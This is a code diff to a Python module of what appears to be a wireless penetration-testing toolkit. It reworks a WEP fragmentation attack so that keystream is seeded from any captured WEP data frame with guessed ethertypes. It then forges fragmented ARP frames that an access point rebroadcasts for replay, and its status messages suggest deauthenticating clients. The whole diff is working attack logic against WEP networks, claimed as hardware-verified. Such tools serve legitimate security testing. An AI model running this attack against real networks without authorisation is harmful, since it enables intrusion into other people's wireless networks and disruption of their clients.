@@ -1,10 +1,13 @@
 """WEP fragmentation attack (`aireplay-ng -5`) — M5.
 
-Recovers a forged ARP when there's no client ARP worth replaying: XOR a captured
-broadcast ARP against its fixed LLC/SNAP+ethertype prefix for 8 bytes of
-keystream, then fragment a known-plaintext broadcast ARP into ≤16 tiny frames
-encrypted under that seed. The AP reassembles them, re-encrypts under a fresh
-IV, and rebroadcasts the result — which is itself a replayable ARP seed.
+Manufactures a replayable ARP when there's none to capture — the whole reason
+`-5` exists. Seed 8 bytes of keystream from ANY captured WEP *data* frame via
+its fixed LLC/SNAP prefix (NOT a broadcast ARP — depending on one would be
+circular: ARP replay would already have that seed), then fragment a
+known-plaintext broadcast ARP into ≤16 tiny frames encrypted under that seed.
+The AP reassembles them, re-encrypts under a fresh IV, and rebroadcasts the
+result — which is itself a replayable ARP seed. So one ordinary client data
+packet (a TCP segment you can't replay) becomes a forged ARP you can.
 
 HARDWARE-VERIFIED end-to-end (2026-05-24, dd-wrt, rtl8821au): a decrypted relay
 matched our forged ARP byte-for-byte. The crypto is in wep_crypto.py
@@ -38,12 +41,16 @@ from wifit3.engine.models import AccessPoint
 from wifit3.engine.attacks.wep.wep_crypto import (
     arp_request_plaintext,
     build_fragments,
-    seed_keystream_from_arp,
+    seed_keystream_from_data,
 )
 
 logger = logging.getLogger(__name__)
 
 _BROADCAST = b"\xff" * 6
+# Ethertypes to assume for the seed's 7th-8th keystream bytes (the SNAP header's
+# first 6 are certain). IP dominates real traffic; ARP is the other common case.
+# A wrong guess just yields no relay → the seed rotates.
+_SEED_ETHERTYPES = (0x0800, 0x0806)
 
 
 def _str_to_mac(s: str) -> bytes:
@@ -105,8 +112,9 @@ class WepFragmentation:
 
         # Current seed (IV + 8-byte keystream) and the fragments built from it.
         self._seed_iv: Optional[bytes] = None
+        self._seed_key: Optional[tuple] = None   # (iv, ethertype) under test
         self._frags: List[bytes] = []
-        self._tried_seeds: set[bytes] = set()    # seed IVs that yielded nothing
+        self._tried: set = set()                 # (iv, ethertype) keys gone dry
         self._round = 0
         self._rounds_on_seed = 0
 
@@ -155,49 +163,42 @@ class WepFragmentation:
 
     # ---- Seed + fragment building -------------------------------------------
 
-    def _wep_body(self, captured: bytes) -> Optional[bytes]:
-        """IV(3)+KeyID(1)+cipher+ICV from a full captured 802.11 frame."""
-        if len(captured) < 28:
-            return None
-        body = captured[_hdr_len(captured[0], captured[1]):]
-        return body if len(body) >= 8 else None
-
     def _pick_seed(self) -> bool:
-        """Choose a not-yet-blacklisted broadcast ARP as the keystream seed and
-        build the fragment train from it. Returns True if a usable seed was
-        found + fragments built."""
-        for raw in reversed(self.store.arp_candidates(self.bssid)):  # newest 1st
-            body = self._wep_body(raw)
-            if not body:
-                continue
-            iv = body[:3]
-            if iv in self._tried_seeds:
-                continue
-            try:
-                seed_ks = seed_keystream_from_arp(body, want=8)
-            except ValueError:
-                continue
-            payload = arp_request_plaintext(
-                sender_mac=self.source_mac,
-                sender_ip=self._sender_ip,
-                target_ip=self._target_ip,
-            )
-            try:
-                self._frags = build_fragments(
-                    seed_ks, iv, payload,
-                    bssid=_str_to_mac(self.bssid),
-                    source_mac=self.source_mac,
-                    dest_mac=_BROADCAST,
+        """Choose a not-yet-exhausted (data-frame, ethertype-guess) seed and
+        build the fragment train from it. Seeds come from ANY captured WEP data
+        frame (store.seed_samples) — never a replayable ARP. Returns True if a
+        usable seed was found + fragments built."""
+        payload = arp_request_plaintext(
+            sender_mac=self.source_mac,
+            sender_ip=self._sender_ip,
+            target_ip=self._target_ip,
+        )
+        for iv, cipher in reversed(self.store.seed_samples(self.bssid)):  # new 1st
+            for etype in _SEED_ETHERTYPES:
+                key = (iv, etype)
+                if key in self._tried:
+                    continue
+                try:
+                    seed_ks = seed_keystream_from_data(
+                        cipher, want=8, ethertype=etype
+                    )
+                    self._frags = build_fragments(
+                        seed_ks, iv, payload,
+                        bssid=_str_to_mac(self.bssid),
+                        source_mac=self.source_mac,
+                        dest_mac=_BROADCAST,
+                    )
+                except ValueError:
+                    continue
+                self._seed_iv = iv
+                self._seed_key = key
+                self._rounds_on_seed = 0
+                self._log(
+                    f"[green]Fragmentation:[/green] seeded from data frame IV "
+                    f"{iv.hex()} [dim](ethertype {etype:#06x}, "
+                    f"{len(self._frags)} fragments)[/dim]"
                 )
-            except ValueError:
-                continue
-            self._seed_iv = iv
-            self._rounds_on_seed = 0
-            self._log(
-                f"[green]Fragmentation:[/green] seeded from IV {iv.hex()} "
-                f"[dim]({len(self._frags)} fragments)[/dim]"
-            )
-            return True
+                return True
         return False
 
     # ---- Send loop ----------------------------------------------------------
@@ -228,9 +229,10 @@ class WepFragmentation:
                 # seed is persistently barren, rotate to a different one.
                 self._rounds_on_seed += 1
                 if self._rounds_on_seed >= self._RESEED_AFTER:
-                    if self._seed_iv is not None:
-                        self._tried_seeds.add(self._seed_iv)
+                    if self._seed_key is not None:
+                        self._tried.add(self._seed_key)
                     self._seed_iv = None      # force a re-pick next iteration
+                    self._seed_key = None
                 self._maybe_heartbeat()
         except asyncio.CancelledError:
             pass
@@ -303,9 +305,9 @@ class WepFragmentation:
         self._last_state = state
         if state == "seeding":
             self._log(
-                "[green]Fragmentation:[/green] [white]waiting for a broadcast "
-                "ARP to seed from[/white] [dim](deauth a client to provoke "
-                "one)[/dim]"
+                "[green]Fragmentation:[/green] [white]waiting for any WEP data "
+                "frame to seed from[/white] [dim](need one client packet — "
+                "deauth a client or wait for traffic)[/dim]"
             )
         elif state == "waiting-auth":
             self._log("[green]Fragmentation:[/green] [dim]waiting for "
